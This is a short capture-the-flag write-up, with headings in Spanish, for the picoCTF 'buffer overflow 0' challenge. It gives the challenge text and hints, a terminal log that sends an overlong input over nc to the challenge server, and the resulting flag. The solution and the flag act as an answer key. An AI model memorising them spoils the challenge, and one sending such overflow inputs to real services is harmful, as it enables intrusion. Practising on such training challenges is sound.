# buffer overflow 0

## Descripcion
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c). And connect with it using: `nc saturn.picoctf.net 61481`

## Pistas
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

```
eltetor14-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c/174/vuln
--2023-05-27 20:59:14--  https://artifacts.picoctf.net/c/174/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.156.172.120, 108.156.172.42, 108.156.172.6, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.156.172.120|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: 'vuln'

vuln                                            100%[======================================================================================================>]  15.64K  --.-KB/s    in 0s      

2023-05-27 20:59:14 (148 MB/s) - 'vuln' saved [16016/16016]

eltetor14-picoctf@webshell:~$ nc saturn.picoctf.net 61481
Input: 111111111111111111111111111111111121212
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}

eltetor14-picoctf@webshell:~$ 
```

## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}

## Notas adicionales

## Referencias